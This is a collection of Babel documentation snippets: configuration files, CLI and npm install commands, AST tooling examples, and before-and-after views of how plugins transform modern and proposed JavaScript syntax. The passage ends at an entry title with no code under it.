DESCRIPTION: Shows how to create custom Babel presets by exporting a configuration object that can include plugins and other presets.

LANGUAGE: javascript
CODE:
module.exports = function() {
  return {
    plugins: ["pluginA", "pluginB", "pluginC"],
  };
};

LANGUAGE: javascript
CODE:
module.exports = () => ({
  presets: [require("@babel/preset-env")],
  plugins: [
    [require("@babel/plugin-transform-class-properties"), { loose: true }],
    require("@babel/plugin-transform-object-rest-spread"),
  ],
});

----------------------------------------

TITLE: Basic AST Traversal and Node Modification
DESCRIPTION: Demonstrates how to parse JavaScript code into an AST and traverse it to modify identifier names. Uses @babel/parser for parsing and @babel/traverse for tree traversal.

LANGUAGE: javascript
CODE:
import * as parser from "@babel/parser";
import traverse from "@babel/traverse";

const code = `function square(n) {
  return n * n;
}`;

const ast = parser.parse(code);

traverse(ast, {
  enter(path) {
    if (path.isIdentifier({ name: "n" })) {
      path.node.name = "x";
    }
  },
});

----------------------------------------

TITLE: Basic AST Generation Example
DESCRIPTION: Demonstrates basic usage of @babel/generator to convert an AST back into code. Shows parsing a simple class definition and generating code from its AST.

LANGUAGE: javascript
CODE:
import { parse } from "@babel/parser";
import generate from "@babel/generator";

const code = "class Example {}";
const ast = parse(code);

const output = generate(
  ast,
  {
    /* options */
  },
  code
);

----------------------------------------

TITLE: Demonstrating TypeScript 4.1 Key Remapping in Mapped Types
DESCRIPTION: This example illustrates key remapping in mapped types, a new feature in TypeScript 4.1 that allows complex object transformations at the type level.

LANGUAGE: typescript
CODE:
type Getters<T> = {
    [K in keyof T as `get${Capitalize<K>}`]: () => T[K]
};

interface Dog { name: string; age: number; }

const lazyDog: Getters<Dog> = /* ... */;
lazyDog.getName(); // string
lazyDog.age; // error!

----------------------------------------

TITLE: Configuring Karma with Babel Preprocessor
DESCRIPTION: Sets up Karma configuration to process JavaScript files using Babel preprocessor. Specifies file patterns for source and test files, enables Babel preprocessing, and configures Babel with preset-env and source map generation.

LANGUAGE: javascript
CODE:
module.exports = function(config) {
  config.set({
    files: [
      "src/**/*.js",
      "test/**/*.js"
    ],
    preprocessors: {
      "src/**/*.js": ["babel"],
      "test/**/*.js": ["babel"]
    },
    "babelPreprocessor": {
      // options go here
      options: {
        presets: ["@babel/preset-env"],
        sourceMap: "inline"
      },
    }
  });
};

----------------------------------------

TITLE: Basic TypeScript Transform Example
DESCRIPTION: Demonstrates basic type removal from TypeScript code

LANGUAGE: typescript
CODE:
const x: number = 0;

LANGUAGE: typescript
CODE:
const x = 0;

----------------------------------------

TITLE: Configuring Babel with JavaScript Config File
DESCRIPTION: Example showing how to use the new babel.config.js configuration format to conditionally apply plugins based on environment.

LANGUAGE: JavaScript
CODE:
var env = process.env.NODE_ENV;
module.exports = {
  plugins: [
    env === "production" && "babel-plugin-that-is-cool"
  ].filter(Boolean)
};

----------------------------------------

TITLE: Implementing Simple Class Decorator in JavaScript
DESCRIPTION: Demonstrates a basic class decorator that adds a property to the decorated class.

LANGUAGE: JavaScript
CODE:
@annotation
class MyClass {}

function annotation(target) {
  target.annotated = true;
}

----------------------------------------

TITLE: Demonstrating Object Rest Spread in JavaScript
DESCRIPTION: Shows how the object-rest-spread plugin now works independently, allowing destructuring of objects into separate variables.

LANGUAGE: JavaScript
CODE:
const { a, ...b } = c;

----------------------------------------

TITLE: Basic Babel CLI Usage
DESCRIPTION: Examples of basic Babel CLI commands including file compilation and watching for changes

LANGUAGE: shell
CODE:
npx babel script.js

LANGUAGE: shell
CODE:
npx babel --help

LANGUAGE: shell
CODE:
npx babel script.js --out-file script-compiled.js

LANGUAGE: shell
CODE:
npx babel script.js --watch --out-file script-compiled.js

----------------------------------------

TITLE: Detailed Babel Register Configuration
DESCRIPTION: Comprehensive configuration example showing various options including ignore conditions, accept conditions, extensions and cache settings

LANGUAGE: javascript
CODE:
require("@babel/register")({\n  // Array of ignore conditions, either a regex or a function. (Optional)\n  // File paths that match any condition are not compiled.\n  ignore: [\n    // When a file path matches this regex then it is **not** compiled\n    /regex/,\n\n    // The file's path is also passed to any ignore functions. It will\n    // **not** be compiled if `true` is returned.\n    function(filepath) {\n      return filepath !== \"/path/to/es6-file.js\";\n    },\n  ],\n\n  // Array of accept conditions, either a regex or a function. (Optional)\n  // File paths that match all conditions are compiled.\n  only: [\n    // File paths that **don't** match this regex are not compiled\n    /my_es6_folder/,\n\n    // File paths that **do not** return true are not compiled\n    function(filepath) {\n      return filepath === \"/path/to/es6-file.js\";\n    },\n  ],\n\n  // Setting this will remove the currently hooked extensions of `.es6`, `.es`, `.jsx`, `.mjs`\n  // and .js so you'll have to add them back if you want them to be used again.\n  extensions: [\".es6\", \".es\", \".jsx\", \".js\", \".mjs\"],\n\n  // Setting this to false will disable the cache.\n  cache: true,\n});

----------------------------------------

TITLE: Configuring babel-preset-env for browser targeting
DESCRIPTION: Example configuration for babel-preset-env targeting Chrome 55 and the last 2 versions of other browsers using browserslist.

LANGUAGE: JavaScript
CODE:
{
  "presets": [
    ["env", {
      "targets": {
        "chrome": 55,
        "browsers": ["last 2 versions"]
      }
    }]
  ]
}

----------------------------------------

TITLE: Synchronous Code Transformation
DESCRIPTION: Example of synchronous code transformation using transformSync

LANGUAGE: javascript
CODE:
var result = babel.transformSync("code();", options);
result.code;
result.map;
result.ast;

----------------------------------------

TITLE: Transforming Nullish Coalescing Operator in JavaScript
DESCRIPTION: Demonstrates how the nullish coalescing operator is transformed from its shorthand syntax to a more verbose equivalent that checks for null and undefined values.

LANGUAGE: JavaScript
CODE:
var foo = object.foo ?? "default";

LANGUAGE: JavaScript
CODE:
var _object$foo;

var foo =
  (_object$foo = object.foo) !== null && _object$foo !== void 0
    ? _object$foo
    : "default";

----------------------------------------

TITLE: Configuring React JSX Builder Helper in Babel
DESCRIPTION: Demonstrates the configuration and usage of @babel/helper-builder-react-jsx helper. The module provides hooks for filtering JSX elements and manipulating their state during the transformation process. It includes type definitions for element state and configuration options for handling JSX transformations.

LANGUAGE: javascript
CODE:
type ElementState = {
  tagExpr: Object; // tag node
  tagName: string; // raw string tag name
  args: Array<Object>; // array of call arguments
  call?: Object; // optional call property that can be set to override the call expression returned
};

require("@babel/helper-builder-react-jsx")({
  filter: function (element: JSXElement) {
    // if returns false, the element isn't transformed
  },

  pre: function (state: ElementState) {
    // function called with (state: ElementState) before building attribs
  },

  post: function (state: ElementState) {
    // function called with (state: ElementState) after building attribs
  },

  compat?: boolean // true if React is in compat mode
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-react-jsx
DESCRIPTION: This shell command demonstrates how to install the @babel/plugin-transform-react-jsx plugin using npm. It's a prerequisite for using the plugin in a Babel configuration.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-react-jsx

----------------------------------------

TITLE: Using Optional Chaining in JavaScript
DESCRIPTION: Demonstrates usage of optional chaining (?.) for safe property access and method calls on potentially nullish values.

LANGUAGE: JavaScript
CODE:
const city = person.address?.city; // person.address could be not defined
const isNeighbor = person.address?.isCloseTo(me);

person.sayHayUsing?.("Twitter"); // The person.sayHayUsing method could be not defined

----------------------------------------

TITLE: Implementing Class Method Decorator in JavaScript
DESCRIPTION: Demonstrates a method decorator that binds the method to the class instance using an initializer.

LANGUAGE: JavaScript
CODE:
class C {
  message = "hello!";

  @bound
  m() {
    console.log(this.message);
  }
}

function bound(value, { name, addInitializer }) {
  addInitializer(function () {
    this[name] = this[name].bind(this);
  });
}

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the destructuring transform plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-destructuring

----------------------------------------

TITLE: Transforming Block-Scoped Functions with Babel
DESCRIPTION: Demonstrates the transformation of a block-scoped function into a let declaration with a function expression. This plugin converts block-scoped function declarations to maintain expected scoping behavior.

LANGUAGE: JavaScript
CODE:
{
  function name(n) {
    return n;
  }
}

name("Steve");

LANGUAGE: JavaScript
CODE:
{
  let name = function(n) {
    return n;
  };
}
name("Steve");

----------------------------------------

TITLE: Transforming Property Literals in JavaScript Objects
DESCRIPTION: This snippet demonstrates how the plugin transforms property literals in JavaScript objects. It shows that reserved words used as property names are wrapped in quotes, while other properties remain unchanged.

LANGUAGE: JavaScript
CODE:
var foo = {
  // changed
  const: function() {},
  var: function() {},

  // not changed
  "default": 1,
  [a]: 2,
  foo: 1,
};

LANGUAGE: JavaScript
CODE:
var foo = {
  "const": function() {},
  "var": function() {},

  "default": 1,
  [a]: 2,
  foo: 1,
};

----------------------------------------

TITLE: Configuring Babel Task in Grunt
DESCRIPTION: This snippet demonstrates how to configure the Babel task in a Grunt setup. It includes setting Babel options like sourceMap and presets, specifying input and output files, loading the Babel npm task, and registering it as the default task.

LANGUAGE: JavaScript
CODE:
grunt.initConfig({
  babel: {
    options: {
      sourceMap: true,
      presets: ["@babel/preset-env"],
    },
    dist: {
      files: {
        "dist/app.js": "src/app.js",
      },
    },
  },
});

grunt.loadNpmTasks('grunt-babel');

grunt.registerTask("default", ["babel"]);

----------------------------------------

TITLE: Complete Async Generator Usage Example
DESCRIPTION: Comprehensive example showing async generator function with promise stream processing and iteration.

LANGUAGE: javascript
CODE:
async function* genAnswers() {
  var stream = [Promise.resolve(4), Promise.resolve(9), Promise.resolve(12)];
  var total = 0;
  for await (let val of stream) {
    total += await val;
    yield total;
  }
}

function forEach(ai, fn) {
  return ai.next().then(function(r) {
    if (!r.done) {
      fn(r);
      return forEach(ai, fn);
    }
  });
}

var output = 0;
forEach(genAnswers(), function(val) {
  output += val.value;
}).then(function() {
  console.log(output); // 42
});

----------------------------------------

TITLE: Basic TypeScript to JavaScript Transformation Example
DESCRIPTION: Demonstrates basic type stripping from TypeScript to JavaScript

LANGUAGE: typescript
CODE:
const x: number = 0;

LANGUAGE: javascript
CODE:
const x = 0;

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: Example of using the plugin programmatically via the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-inline-elements"],
});

----------------------------------------

TITLE: Configuring Babel Parser Options in JSON
DESCRIPTION: Shows how to specify parser options directly in the Babel configuration file to enable specific syntax plugins.

LANGUAGE: json
CODE:
{
  "parserOpts": {
    "plugins": ["jsx", "flow"]
  }
}

----------------------------------------

TITLE: Demonstrating Import Assertions Syntax
DESCRIPTION: This snippet shows the updated syntax for import assertions, which replaced the previous module attributes proposal. It demonstrates how to use assertions with both static and dynamic imports.

LANGUAGE: javascript
CODE:
import json from "./foo.json" assert { type: "json" };

import("foo.json", { assert: { type: "json" } });

----------------------------------------

TITLE: Using @babel/plugin-proposal-decorators via Node API in JavaScript
DESCRIPTION: Demonstrates how to use the @babel/plugin-proposal-decorators plugin programmatically using the Babel Core API in Node.js.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: [
    ["@babel/plugin-proposal-decorators", { version: "2023-11" }],
  ]
});

----------------------------------------

TITLE: Basic ES Module to CommonJS Transform Example
DESCRIPTION: Demonstrates the basic transformation of an ES module default export to CommonJS format.

LANGUAGE: javascript
CODE:
export default 42;

LANGUAGE: javascript
CODE:
Object.defineProperty(exports, "__esModule", {
  value: true,
});

exports.default = 42;

----------------------------------------

TITLE: React Element Transformation Example
DESCRIPTION: Demonstrates how the plugin transforms a simple React JSX element into an optimized inline form using babelHelpers.jsx instead of React.createElement.

LANGUAGE: javascript
CODE:
<Baz foo="bar" key="1" />

LANGUAGE: javascript
CODE:
babelHelpers.jsx(
  Baz,
  {
    foo: "bar",
  },
  "1"
);

/**
 * Instead of
 *
 * React.createElement(Baz, {
 *   foo: "bar",
 *   key: "1",
 * });
 */

----------------------------------------

TITLE: Creating Parameterized Class Decorator in JavaScript
DESCRIPTION: Shows how to create a class decorator that accepts a parameter and applies it to the decorated class.

LANGUAGE: JavaScript
CODE:
@isTestable(true)
class MyClass {}

function isTestable(value) {
  return function decorator(target) {
    target.isTestable = value;
  };
}

----------------------------------------

TITLE: Configuring @babel/plugin-proposal-decorators in babel.config.json
DESCRIPTION: JSON configuration for enabling the @babel/plugin-proposal-decorators plugin with the 2023-11 version in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-decorators", { "version": "2023-11" }]
  ]
}

----------------------------------------

TITLE: Demonstrating Rest Properties in JavaScript
DESCRIPTION: This snippet shows how to use rest properties to destructure an object, separating specific properties from the rest.

LANGUAGE: JavaScript
CODE:
let { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };
console.log(x); // 1
console.log(y); // 2
console.log(z); // { a: 3, b: 4 }

----------------------------------------

TITLE: Using Stage 2 Decorators in JavaScript with Babel 7.1.0
DESCRIPTION: Demonstrates the usage of the new Stage 2 decorators syntax implemented in @babel/plugin-proposal-decorators. This feature allows adding decorators to class methods.

LANGUAGE: JavaScript
CODE:
class MyClass {
  @decorator
  method() {}
}

----------------------------------------

TITLE: Type-Specific AST Node Traversal
DESCRIPTION: Shows how to target specific node types during AST traversal using @babel/traverse. This example modifies function declaration names.

LANGUAGE: javascript
CODE:
traverse(ast, {
  FunctionDeclaration: function(path) {
    path.node.id.name = "x";
  },
});

----------------------------------------

TITLE: Transforming Literals Example - JavaScript
DESCRIPTION: Example showing how the plugin transforms binary, octal, and unicode string literals into their standard JavaScript equivalents.

LANGUAGE: javascript
CODE:
var b = 0b11; // binary integer literal
var o = 0o7; // octal integer literal
const u = "Hello\u{000A}\u{0009}!"; // unicode string literals, newline and tab

LANGUAGE: javascript
CODE:
var b = 3; // binary integer literal
var o = 7; // octal integer literal
const u = "Hello\n\t!"; // unicode string literals, newline and tab

----------------------------------------

TITLE: Configuring Babel using JavaScript (babel.config.js)
DESCRIPTION: Create a babel.config.js file to configure Babel using JavaScript. This allows for dynamic configuration based on environment variables or other Node.js APIs.

LANGUAGE: javascript
CODE:
module.exports = function (api) {
  api.cache(true);

  const presets = [ ... ];
  const plugins = [ ... ];

  if (process.env["ENV"] === "prod") {
    plugins.push(...);
  }

  return {
    presets,
    plugins
  };
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example showing how to use the plugin programmatically via the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-private-methods"],
});

----------------------------------------

TITLE: Customizing Automatic Runtime Import Source
DESCRIPTION: This example shows how to customize the import source for the Automatic Runtime using a JSX comment. It demonstrates changing the import source to a custom JSX library.

LANGUAGE: JavaScript
CODE:
/** @jsxImportSource custom-jsx-library */

const profile = (
  <div>
    <img src="avatar.png" className="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);

LANGUAGE: JavaScript
CODE:
import { jsx as _jsx } from "custom-jsx-library/jsx-runtime";
import { jsxs as _jsxs } from "custom-jsx-library/jsx-runtime";

const profile = _jsxs("div", {
  children: [
    _jsx("img", {
      src: "avatar.png",
      className: "profile",
    }),
    _jsx("h3", {
      children: [user.firstName, user.lastName].join(" "),
    }),
  ],
});

----------------------------------------

TITLE: Demonstrating Partial Application in JavaScript
DESCRIPTION: Shows examples of partial application from left, right, and for any argument in JavaScript functions. It also includes an example using the pipeline operator.

LANGUAGE: JavaScript
CODE:
function add(x, y) { return x + y; }

const addOne = add(1, ?); // apply from the left
addOne(2); // 3

const addTen = add(?, 10); // apply from the right
addTen(2); // 12

let newScore = player.score
  |> add(7, ?)
  |> clamp(0, 100, ?); // shallow stack, the pipe to `clamp` is the same frame as the pipe to `add`.

----------------------------------------

TITLE: Configuring ignoreFunctionLength assumption in babel.config.json
DESCRIPTION: This JSON snippet demonstrates how to enable the ignoreFunctionLength assumption, which affects how parameters with default values are counted in function arity.

LANGUAGE: json
CODE:
{
  "assumptions": {
    "ignoreFunctionLength": true
  }
}

----------------------------------------

TITLE: Basic Block Scoping Transformation Example
DESCRIPTION: Demonstrates how the plugin transforms let declarations into var declarations while maintaining scope integrity.

LANGUAGE: javascript
CODE:
{
  let a = 3;
}

let a = 3;

LANGUAGE: javascript
CODE:
{
  var _a = 3;
}

var a = 3;

----------------------------------------

TITLE: Setting Babel Caller Options
DESCRIPTION: Example showing how to set caller information when using Babel's transform API programmatically.

LANGUAGE: JavaScript
CODE:
babel.transformFileSync("example.js", {
  caller: {
    name: "my-custom-tool",
    supportsStaticESM: true,
  },
});

----------------------------------------

TITLE: Basic Code Transformation
DESCRIPTION: Basic example of transforming code using babel.transform with callback

LANGUAGE: javascript
CODE:
babel.transform(code, options, function(err, result) {
  result; // => { code, map, ast }
});

----------------------------------------

TITLE: Configuring @babel/preset-react with options in babel.config.json (Babel 7)
DESCRIPTION: Advanced configuration for @babel/preset-react in babel.config.json file with pragma, pragmaFrag, throwIfNamespace, and runtime options for Babel 7.

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "@babel/preset-react",
      {
        "pragma": "dom",
        "pragmaFrag": "DomFrag",
        "throwIfNamespace": false,
        "runtime": "classic"
      }
    ]
  ]
}

----------------------------------------

TITLE: Basic Babel Register Usage
DESCRIPTION: Simple usage example showing how to require and enable Babel register

LANGUAGE: javascript
CODE:
require("@babel/register");

----------------------------------------

TITLE: Installing @babel/preset-react via npm
DESCRIPTION: Command to install the @babel/preset-react preset using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-react

----------------------------------------

TITLE: Module Attributes in JavaScript Import Statements
DESCRIPTION: Demonstrates the new Stage 1 proposal for Module Attributes, allowing additional metadata to be specified for imports.

LANGUAGE: JavaScript
CODE:
import metadata from "./package.json" with type: "json";

LANGUAGE: JavaScript
CODE:
const metadata = await import(
  "./package.json",
  { with: { type: "json" } },
);

----------------------------------------

TITLE: Using @babel/standalone API in JavaScript
DESCRIPTION: Shows how to use the Babel.transform API to transpile JavaScript code with a specific preset.

LANGUAGE: javascript
CODE:
var input = 'const getMessage = () => "Hello World";';
var output = Babel.transform(input, { presets: ["env"] }).code;

----------------------------------------

TITLE: Using Explicit Resource Management in JavaScript
DESCRIPTION: Demonstrates the usage of 'using' and 'await using' declarations for synchronous and asynchronous resource disposal.

LANGUAGE: JavaScript
CODE:
{
  using fileHandle = filesystem.open("./my/file.txt");

  write(fileHandle, "Hello!");
} // At the end of the block, fileHandle will be automatically closed.

LANGUAGE: JavaScript
CODE:
{
  await using db = await Database.connect("//my-db.sql");
  db.query("INSERT INTO tools (name, version) VALUES ('Babel', '7.22.0')");
} // At the end of the block, the db connection will be closed asynchronously

----------------------------------------

TITLE: Variable Declaration Merging Example in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms multiple consecutive variable declarations into a single statement and merges standalone variables into for loop declarations.

LANGUAGE: javascript
CODE:
// merge into a single VariableDeclaration
var foo = "bar";
var bar = "foo";
foobar();

// merge into the next for loop
var i = 0;
for (var x = 0; x < 10; x++) {}

LANGUAGE: javascript
CODE:
var foo = "bar",
  bar = "foo";
foobar();

for (var i = 0, x = 0; x < 10; x++) {}

----------------------------------------

TITLE: Plugin Usage via CLI
DESCRIPTION: Command line usage of the destructuring transform plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-destructuring script.js

----------------------------------------

TITLE: Optimizing JSX Spread Compilation
DESCRIPTION: Examples showing different approaches to compiling JSX spread attributes, including the new optimized method using object spread.

LANGUAGE: jsx
CODE:
<a x {...y} />

// 🡇 🡇 🡇

React.createElement("a", { x: true, ...y });

----------------------------------------

TITLE: Using Babel Polyfill with require
DESCRIPTION: Shows how to include the polyfill using CommonJS require syntax at the entry point of an application.

LANGUAGE: javascript
CODE:
require("@babel/polyfill");

----------------------------------------

TITLE: Using Import Attributes in JavaScript
DESCRIPTION: Demonstrates the new import attributes syntax for specifying module loading parameters, with a focus on the 'type' attribute for JSON modules.

LANGUAGE: javascript
CODE:
import "./my-module" with { some_param: "hello" };

LANGUAGE: javascript
CODE:
import data from "./data" with { type: "json" };

----------------------------------------

TITLE: Installing Babel Node Dependencies
DESCRIPTION: Commands to install the required Babel dependencies for using babel-node

LANGUAGE: shell
CODE:
npm install --save-dev @babel/core @babel/node

----------------------------------------

TITLE: Loose Mode Configuration Example
DESCRIPTION: Shows how to configure granular control over loose mode assumptions using babel.config.json.

LANGUAGE: json
CODE:
{
  "assumptions": {
    "constantSuper": true,
    "noClassCalls": true,
    "setClassMethods": true,
    "superIsCallableConstructor": true
  }
}

----------------------------------------

TITLE: Importing Babel Core
DESCRIPTION: Different ways to import the @babel/core package in JavaScript

LANGUAGE: javascript
CODE:
var babel = require("@babel/core");
import { transform } from "@babel/core";
import * as babel from "@babel/core";

----------------------------------------

TITLE: Installing Babel Register Dependencies
DESCRIPTION: Installation command for @babel/core and @babel/register using npm or yarn package managers

LANGUAGE: shell
CODE:
npm install @babel/core @babel/register --save-dev

----------------------------------------

TITLE: Transforming a JavaScript class with @babel/runtime
DESCRIPTION: Example of how @babel/plugin-transform-runtime optimizes the class transformation by referencing the helper function from @babel/runtime.

LANGUAGE: javascript
CODE:
var _classCallCheck = require("@babel/runtime/helpers/classCallCheck");

var Circle = function Circle() {
  _classCallCheck(this, Circle);
};

----------------------------------------

TITLE: Configuring @babel/plugin-transform-modules-umd in babel.config.json
DESCRIPTION: Example configuration for using the @babel/plugin-transform-modules-umd plugin in a Babel configuration file. It also shows how to override global names for specific libraries.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-modules-umd"]
}

LANGUAGE: JSON
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-modules-umd",
      {
        "globals": {
          "es6-promise": "Promise"
        }
      }
    ]
  ]
}

----------------------------------------

TITLE: Using Constructor for Component Initialization in ES6+
DESCRIPTION: Shows how the constructor method in ES6+ classes replaces componentWillMount for component initialization in React.

LANGUAGE: JavaScript
CODE:
// The ES5 way
var EmbedModal = React.createClass({
  componentWillMount: function() { … },
});

LANGUAGE: JavaScript
CODE:
// The ES6+ way
class EmbedModal extends React.Component {
  constructor(props) {
    super(props);
    // Operations usually carried out in componentWillMount go here
  }
}

----------------------------------------

TITLE: Specifying Preset Options in Babel JSON
DESCRIPTION: Demonstrates how to specify options for presets in Babel configuration, similar to plugin option specification.

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "env",
      {
        "loose": true,
        "modules": false
      }
    ]
  ]
}

----------------------------------------

TITLE: Arrow Functions Transform Example Output
DESCRIPTION: The transformed ES5 code showing how arrow functions are converted to regular functions with proper this binding and scope handling.

LANGUAGE: javascript
CODE:
var a = function() {};
var a = function(b) {
  return b;
};

const double = [1, 2, 3].map(function(num) {
  return num * 2;
});
console.log(double); // [2,4,6]

var bob = {
  _name: "Bob",
  _friends: ["Sally", "Tom"],
  printFriends() {
    var _this = this;

    this._friends.forEach(function(f) {
      return console.log(_this._name + " knows " + f);
    });
  },
};
console.log(bob.printFriends());

----------------------------------------

TITLE: Basic Function Bind Usage Example
DESCRIPTION: Shows practical examples of using the function bind operator with object methods and chaining operations.

LANGUAGE: javascript
CODE:
const box = {
  weight: 2,
  getWeight() {
    return this.weight;
  },
};

const { getWeight } = box;

console.log(box.getWeight()); // prints '2'

const bigBox = { weight: 10 };
console.log(bigBox::getWeight()); // prints '10'

// Can be chained:
function add(val) {
  return this + val;
}

console.log(bigBox::getWeight()::add(5)); // prints '15'

----------------------------------------

TITLE: Configuring Babel Plugin in JSON
DESCRIPTION: This snippet shows how to configure the @babel/plugin-transform-react-constant-elements plugin in a Babel configuration file (babel.config.json).

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-react-constant-elements"]
}

----------------------------------------

TITLE: Using codeFrameColumns with Start and End Locations
DESCRIPTION: Shows how to use codeFrameColumns with both start and end locations to highlight multiple lines of code.

LANGUAGE: javascript
CODE:
import { codeFrameColumns } from "@babel/code-frame";

const rawLines = `class Foo {
  constructor() {
    console.log("hello");
  }
}`;
const location = {
  start: { line: 2, column: 17 },
  end: { line: 4, column: 3 },
};

const result = codeFrameColumns(rawLines, location, {
  /* options */
});

console.log(result);

----------------------------------------

TITLE: Do Expression in JSX
DESCRIPTION: Demonstrates how do expressions can be used directly within JSX for conditional rendering of components.

LANGUAGE: javascript
CODE:
const Component = props => (
  <div className="myComponent">
    {do {
      if (color === "blue") {
        <BlueComponent />;
      } else if (color === "red") {
        <RedComponent />;
      } else if (color === "green") {
        <GreenComponent />;
      }
    }}
  </div>
);

----------------------------------------

TITLE: Transforming for-of Loop in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms a simple for-of loop into a more verbose, compatible version using iterators and try-catch blocks.

LANGUAGE: JavaScript
CODE:
for (var i of foo) {
}

LANGUAGE: JavaScript
CODE:
var _iteratorNormalCompletion = true;
var _didIteratorError = false;
var _iteratorError = undefined;

try {
  for (
    var _iterator = foo[Symbol.iterator](), _step;
    !(_iteratorNormalCompletion = (_step = _iterator.next()).done);
    _iteratorNormalCompletion = true
  ) {
    var i = _step.value;
  }
} catch (err) {
  _didIteratorError = true;
  _iteratorError = err;
} finally {
  try {
    if (!_iteratorNormalCompletion && _iterator.return != null) {
      _iterator.return();
    }
  } finally {
    if (_didIteratorError) {
      throw _iteratorError;
    }
  }
}

----------------------------------------

TITLE: Demonstrating Object Super Transform in JavaScript
DESCRIPTION: This snippet shows an example of how the object-super transform works, comparing input code with its transformed output. It demonstrates the use of super in object methods.

LANGUAGE: JavaScript
CODE:
let obj = {
  say() {
    return "Hello";
  },
};

let obj2 = {
  say() {
    return super.say() + "World!";
  },
};

LANGUAGE: JavaScript
CODE:
var _obj;

var _get = function get(object, property, receiver) {
  if (object === null) object = Function.prototype;
  var desc = Object.getOwnPropertyDescriptor(object, property);
  if (desc === undefined) {
    var parent = Object.getPrototypeOf(object);
    if (parent === null) {
      return undefined;
    } else {
      return get(parent, property, receiver);
    }
  } else if ("value" in desc) {
    return desc.value;
  } else {
    var getter = desc.get;
    if (getter === undefined) {
      return undefined;
    }
    return getter.call(receiver);
  }
};

var obj = {
  say: function say() {
    return "Hello";
  },
};

var obj2 = (_obj = {
  say: function say() {
    return (
      _get(_obj.__proto__ || Object.getPrototypeOf(_obj), "say", this).call(
        this
      ) + "World!"
    );
  },
});

----------------------------------------

TITLE: Babel Decorator Plugin Configuration
DESCRIPTION: JSON configuration for enabling the decorators plugin in Babel

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-proposal-decorators", { "decoratorsBeforeExport": true }]
}

----------------------------------------

TITLE: JSX Parser Plugin Example
DESCRIPTION: Shows how to use @babel/generator with JSX parser plugin support. Demonstrates parsing and generating JSX code while maintaining JSX syntax.

LANGUAGE: javascript
CODE:
import { parse } from "@babel/parser";
import generate from "@babel/generator";

const code = "const Example = () => <div>example</div>";
const ast = parse(code, { plugins: ["jsx" ] });

const output = generate(
  ast,
);

// true
output.includes("<div>");

----------------------------------------

TITLE: Records and Tuples Transformation
DESCRIPTION: Demonstrates how Babel transforms the new Records and Tuples syntax into polyfilled function calls.

LANGUAGE: javascript
CODE:
let data = #{
  name: "Babel",
  ids: #[1, 2, 3]
};

LANGUAGE: javascript
CODE:
let data = Record({
  name: "Babel",
  ids: Tuple(1, 2, 3),
});

----------------------------------------

TITLE: Template Literal Usage with Dynamic Values
DESCRIPTION: Example using template literals with embedded expressions and placeholders

LANGUAGE: javascript
CODE:
import template from "@babel/template";
import generate from "@babel/generator";
import * as t from "@babel/types";

const source = "my-module";

const fn = template`
  var IMPORT_NAME = require('${source}');
`;

const ast = fn({
  IMPORT_NAME: t.identifier("myModule"),
});

console.log(generate(ast).code);

----------------------------------------

TITLE: Using Object Rest/Spread Transform Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the object rest/spread transform plugin with Babel's command-line interface.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-object-rest-spread script.js

----------------------------------------

TITLE: Configuring Rollup with Babel Plugin
DESCRIPTION: Sets up a Rollup configuration that uses the Babel plugin to process JavaScript files. The configuration specifies an input file from src/index.js, outputs to the 'output' directory in ESM format, and enables bundled babel helpers.

LANGUAGE: javascript
CODE:
import babel from '@rollup/plugin-babel';

const config = {
  input: 'src/index.js',
  output: {
    dir: 'output',
    format: 'esm'
  },
  plugins: [babel({ babelHelpers: 'bundled' })]
};

export default config;

----------------------------------------

TITLE: Configuring Babel Transpiler with Broccoli in JavaScript
DESCRIPTION: This snippet shows how to require the broccoli-babel-transpiler package and use it to create a scriptTree. It demonstrates the basic setup for transpiling JavaScript code using Babel within a Broccoli build process.

LANGUAGE: JavaScript
CODE:
var babelTranspiler = require("broccoli-babel-transpiler");
var scriptTree = babelTranspiler(inputTree, options);

----------------------------------------

TITLE: Configuring Preset Order in Babel JSON
DESCRIPTION: Demonstrates the reverse ordering of presets in Babel configuration, which is opposite to plugin ordering.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-env", "@babel/preset-react"]
}

----------------------------------------

TITLE: AST Transformation
DESCRIPTION: Example of transforming code from an existing AST

LANGUAGE: javascript
CODE:
const sourceCode = "if (true) return;";
const parsedAst = babel.parseSync(sourceCode, {
  parserOpts: { allowReturnOutsideFunction: true }
});
const { code, map, ast } = babel.transformFromAstSync(
  parsedAst,
  sourceCode,
  options
);

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example of using the plugin programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-class-properties"],
});

----------------------------------------

TITLE: Transforming Object.assign with Babel Plugin
DESCRIPTION: Demonstrates how the plugin transforms Object.assign calls into a _extends function call. This transformation is useful for environments that don't support Object.assign natively.

LANGUAGE: JavaScript
CODE:
Object.assign(a, b);

LANGUAGE: JavaScript
CODE:
var _extends = ...;

_extends(a, b);

----------------------------------------

TITLE: Implementing Private Static Accessors in JavaScript Classes
